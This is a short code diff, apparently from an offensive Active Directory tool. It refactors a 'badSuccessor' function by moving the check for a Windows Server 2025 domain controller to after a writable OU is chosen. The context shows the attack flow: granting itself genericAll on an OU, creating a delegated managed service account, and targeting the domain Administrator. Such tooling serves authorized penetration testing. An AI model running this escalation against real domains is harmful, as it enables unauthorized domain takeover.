@@ -30,11 +30,6 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
     """
 
     async def getWeakOU(conn):
-        # Check if one of the DCs is Windows Server 2025 or higher (needed for Kerberos DMSA)
-        compatible_dcs = await utils.findCompatibleDC(conn, min_version=10, scope="DOMAIN")
-        if not compatible_dcs:
-            raise BloodyError("DC2025 not found, DMSA not supported.")
-        
         # Check if the schema version is 2025
         # schema_version = next(
         #     conn.ldap.bloodysearch(
@@ -85,11 +80,16 @@ async def badSuccessor(conn: ConnectionHandler, dmsa: str, t: list = ["CN=Admini
                 await genericAll(conn, ou, conn.conf.username)                        
             else:
                 raise BloodyError("No suitable OU found for adding the DMSA object")
-        return ou, compatible_dcs
+        return ou
 
     ldap = await conn.getLdap()
     if not ou:
-        ou,compatible_dcs = await getWeakOU(conn)
+        ou = await getWeakOU(conn)
+    
+    # Check if one of the DCs is Windows Server 2025 or higher (needed for Kerberos DMSA)
+    compatible_dcs = await utils.findCompatibleDC(conn, min_version=10, scope="DOMAIN")
+    if not compatible_dcs:
+        raise BloodyError("DC2025 not found, DMSA not supported.")
         
     if len(t) == 1:
         t = ["CN=Administrator,CN=Users," + ldap.domainNC]
